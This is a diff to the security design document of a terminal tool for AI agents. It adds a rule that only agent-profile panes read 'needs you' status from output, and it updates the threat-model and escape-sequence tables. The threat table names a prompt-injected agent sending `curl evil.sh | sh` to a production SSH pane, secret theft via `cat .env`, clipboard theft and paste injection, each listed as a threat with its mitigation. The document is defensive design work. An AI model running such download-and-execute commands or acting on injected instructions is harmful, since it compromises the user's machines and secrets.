@@ -5,8 +5,9 @@ Security design section of [`architecture.md`](architecture.md) as amended by re
 finding B1 in [`architecture-review.md`](architecture-review.md) and by
 [ADR-0004](../adr/0004-agent-identity-from-pty.md),
 [ADR-0010](../adr/0010-security-model.md),
-[ADR-0020](../adr/0020-identity-hardening.md) and
-[ADR-0028](../adr/0028-windows-are-spawned-by-the-core.md). Bearer tokens, `PINFOLD_TOKEN` and the
+[ADR-0020](../adr/0020-identity-hardening.md),
+[ADR-0028](../adr/0028-windows-are-spawned-by-the-core.md) and
+[ADR-0045](../adr/0045-agent-panes-read-needs-you-from-output.md). Bearer tokens, `PINFOLD_TOKEN` and the
 owner token no longer exist, whatever older text says.
 
 **Status: partly built.** The sections below are the design. Many of its controls are
@@ -56,7 +57,7 @@ the network (see Sandbox below).
 | T1  | A prompt-injected agent moves sideways to another pane   | Agent in pane 3 sends `curl evil.sh \| sh` to your prod SSH pane                                   | PTY-derived identity; scopes; approval prompt; protected panes; sends split at newlines                        |
 | T2  | An agent reads secrets from other panes                  | `pane.read` on a pane that just ran `cat .env`                                                     | Read of other panes needs approval; secret redaction                                                           |
 | T3  | Hostile program output abuses escape sequences           | Title-report sequence echoes attacker text into the shell's input; OSC 52 reads the clipboard      | Reply sequences disabled; clipboard read off; length limits                                                    |
-| T4  | Spoofed status or alerts                                 | Output prints a fake OSC 133 "done", or floods OSC 9 notifications                                 | Output-reported status labelled as such; API status from a PTY-identified caller outranks it; rate limits      |
+| T4  | Spoofed status or alerts                                 | Output prints a fake OSC 133 "done", or floods OSC 9 notifications                                 | Output-reported status labelled as such; API status from a PTY-identified caller outranks it; only agent-profile panes read "needs you" from output (ADR-0045); rate limits |
 | T5  | Malicious repo content                                   | `.pinfold/layout.toml` runs commands on `pinfold up`; `git diff` runs a hostile `core.fsmonitor`   | Workspace trust prompt; hardened git invocation                                                                |
 | T6  | Hostile files in the built-in tools                      | Escape bytes or Trojan Source bidi characters in a filename; a file that stalls the highlighter    | Control and bidi characters shown escaped; size and time caps                                                  |
 | T7  | Paste injection                                          | Pasted text containing `ESC[201~` ends bracketed paste early and runs the rest                     | Strip paste terminators and control characters; multi-line paste warning                                       |
@@ -92,7 +93,9 @@ with a top-level folder.
 | T4  | API status outranks OSC 133 marks           | `pinfold-core/src/status.rs`, `pinfold-core/src/marks.rs`                      | `api_outranks_output_until_cleared`, `a_fake_error_from_output_does_not_silence_an_api_alert` (`status.rs`)                             |
 | T4  | Status alerts rate-limited                  | `pinfold-core/src/status.rs`                                                  | `flapping_needs_you_fifty_times_in_one_second_raises_one_alert` (`status.rs`)                                                           |
 | T4  | OSC 133 marks stay in their pane, never say "needs you" or alert | `pinfold-core/src/status.rs` (`observe_shell`), `pinfold-core/src/io.rs` | `spoofed_marks_stay_in_their_pane_and_never_say_needs_you` (`io.rs`) |
-| T4  | OSC 9 and 777 notifications: limit zero | Not built: the parser drops them and the core shows no notifications. A feature that shows them must add a real limit | `a_flood_of_osc_9_and_777_notifications_is_dropped_whole` (`vt.rs`) pins the drop |
+| T4  | OSC 7501 states and OSC 9 say "needs you" only in an agent profile's pane, labelled as from output; a plain shell pane printing the same bytes never does (ADR-0045) | `pinfold-core/src/status.rs` (`observe_agent`), `pinfold-core/src/io.rs` (`read_agent_signals`), `pinfold-cli/src/bin/pinfold-core.rs` (`agent.launch`) | `agent_signals_say_needs_you_only_in_an_agent_profiles_pane` (`io.rs`), `a_shell_pane_never_needs_you_from_output_and_a_report_outranks_an_agent` (`status.rs`), `recorded_agent_sessions_show_the_expected_statuses` (`pinfold-core/tests/agent_sessions.rs`: `codex.rec` in a plain pane never shows needs you) |
+| T4  | Needs you from output clears on the CLI's next state, its command's end, or typing | `pinfold-core/src/status.rs` (`observe_agent`, `typed`), `pinfold-core/src/link.rs` (`note_input`) | `an_agent_pane_needs_you_until_its_cli_moves_on_or_the_person_types` (`status.rs`) |
+| T4  | OSC 9 and 777 text never shown; their alerts rate-limited | The parser drops both and the core keeps no text, only a count of OSC 9. An agent pane's needs you alerts once per pane per 10 s. Notifications from the window are not built yet | `a_flood_of_osc_9_and_777_notifications_only_moves_a_counter` (`vt.rs`), `a_flapping_agent_cli_raises_one_alert_in_ten_seconds` (`status.rs`) |
 | T5  | Workspace trust prompt                      | `pinfold-api/src/trust.rs`, `pinfold-core/src/grants.rs`, `pinfold-config/src/workspace.rs` | `only_the_window_answers_a_trust_prompt_and_trusting_records_the_layout`, `up_runs_a_trusted_workspace_and_a_restore_runs_it_again_until_its_file_changes` (`session.rs`) |
 | T5  | Hardened git invocation                     | Not built: no built-in tool runs git yet (M4)                                 | [#262](https://github.com/0xPiranhaCodes/pinfold.sh/issues/262) |
 | T6  | Escaped filenames, size and time caps       | Not built: `pinfold-tools` is empty (M4)                                      | [#263](https://github.com/0xPiranhaCodes/pinfold.sh/issues/263) |
@@ -302,7 +305,8 @@ keystrokes, run commands or leave the machine without your action.
 | Title report (`CSI 21 t`), DECRQSS, queries that echo strings  | Attacker text written into the shell's input      | Not answered; only fixed-format replies such as cursor position     |
 | OSC 52 clipboard                                               | Steal the clipboard, or plant a malicious command | Read off. Write allowed with a status-bar flash, max 64 KB          |
 | OSC 8 hyperlinks                                               | Link text that hides the real target              | Real URL shown on hover; `http(s)` on Ctrl + click; others ask      |
-| OSC 9 / 777 notifications                                      | Spam, or alerts that look like system ones        | 1 per 10 s per pane; sanitized and prefixed with the pane name      |
+| OSC 9 / 777 notifications                                      | Spam, or alerts that look like system ones        | Text never shown; OSC 9 says needs you only in an agent profile's pane, alerting 1 per 10 s per pane, in PinFold's words (ADR-0045) |
+| OSC 7501 agent states                                          | A fake "needs you" or "done"                      | Read only in an agent profile's pane, labelled from output; API status outranks them (ADR-0045) |
 | OSC 133 marks                                                  | Fake "done" or exit codes                         | Shown as "reported by output"; API status outranks them             |
 | OSC 7 cwd                                                      | Path traversal into restore and the file manager  | Must be an existing absolute directory; used only as a hint         |
 | Very long sequences, titles, hyperlinks                        | Memory exhaustion                                 | Caps: 4 KB per sequence, 256 B per title, 2,000 hyperlinks per pane |
